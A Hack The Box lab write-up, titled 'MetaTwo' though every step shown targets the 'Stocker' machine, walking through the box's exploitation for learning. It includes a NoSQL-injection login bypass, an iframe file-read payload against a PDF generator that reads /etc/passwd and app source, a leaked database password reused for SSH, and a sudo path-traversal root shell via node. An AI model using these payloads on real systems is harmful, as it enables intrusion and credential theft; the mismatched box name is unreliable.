Hello welcome to another write up this time on box from Hackthebox called MetaTwo.

Let's start with nmap:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-04 06:31 EDT
Nmap scan report for 10.10.11.196 (10.10.11.196)
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see the domain name so now we can fuzz subdomains:

```
# ffuf -u http://stocker.htb/ -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt                                                                                             

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 121ms]
```

It has just two ports open 22 and 80. Let's start by adding the domain name to our `/etc/hosts` file:

```
# echo "10.10.11.196 stocker.htb dev.stocker.htb" >> /etc/hosts 
```

And now visit the page

IMG1

The page looks static. We can try visiting stocker.htb/index.html and hovering over links shows directories with #.

So now let's move on to `dev.stocker.htb`:

IMG2

Looking at the burp with response of the site we can get this info:

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 05 Jul 2023 13:35:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 92
Connection: close
X-Powered-By: Express
Location: /login?error=login-error
Vary: Accept

<p>Found. Redirecting to <a href="/login?error=login-error">/login?error=login-error</a></p>
```

We can see that it uses Express which is usually part of the MERN stack - MongoDB, ExpressJS, ReactJS, and Node.js.
With that we can try nosql injection on the login page. 

```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 29
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AzZ5bv6pSMJi52yO9jH3sIliGNK5DfAnO.F%2BmMLf09fnL7xSjIcDNgxO3JhU6dPEXunSZzKOldnBc
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```

And we're successfully in. There is a functionality to export order to pdf.

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
Connection: close
Cookie: connect.sid=s%3AzZ5bv6pSMJi52yO9jH3sIliGNK5DfAnO.F%2BmMLf09fnL7xSjIcDNgxO3JhU6dPEXunSZzKOldnBc

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<h1>test</h1>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

IMG4

We see that we have xss. 

```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
Connection: close
Cookie: connect.sid=s%3AzZ5bv6pSMJi52yO9jH3sIliGNK5DfAnO.F%2BmMLf09fnL7xSjIcDNgxO3JhU6dPEXunSZzKOldnBc

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src="file:///etc/passwd" width="1000" height="1000">","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

This doesn't work because we need to escape " character:

```
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=\"file:///etc/passwd\" width=\"1000\" height=\"1000\">","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

IMG5

We can note that there is user angoose.
When I did walkthrough through this box i crash it while tampering the request which returned this response:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 07 Jul 2023 11:10:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 967
Connection: close
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token } in JSON at position 158<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre>
</body>
</html>
```

We can now try to get the source which is in `/var/www/dev`:

```
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=\"file:///var/www/dev/index.js\" width=\"1000\" height=\"1000\">","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

This returns source code with password:

```
Stockers - Purchase Order
Supplier
Stockers Ltd.
1 Example Road
Folkestone
Kent
CT19 5QS
GB
Purchaser
Angoose
1 Example Road
London
GB
7/7/2023
Thanks for shopping with us!
Your order summary:
Item Price
(£) Qu
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
if (!req.session.user) return res.json([]);
const products = await mongoose.model("Product").find();
return res.json(products);
});
app.get("/login", (req, res) => {
if (req.session.user) return res.redire
```

And we got ssh shell 

```
# ssh angoose@stocker.htb 
The authenticity of host 'stocker.htb (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'stocker.htb' (ED25519) to the list of known hosts.
angoose@stocker.htb's password: 
angoose@stocker:~$ ls
user.txt
```

We can run node.js with sudo which is gtfobin https://gtfobins.github.io/gtfobins/node/#sudo

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

We can use ../ in the path of the sudo command:

```
angoose@stocker:/usr/local/scripts$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/*.js
# id
uid=0(root) gid=0(root) groups=0(root)
```

I've put `require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})` to /tmp/test.js and got root shell.

Thanks for reading u can message me on twitter https://twitter.com/Vojtech1337 and until next time.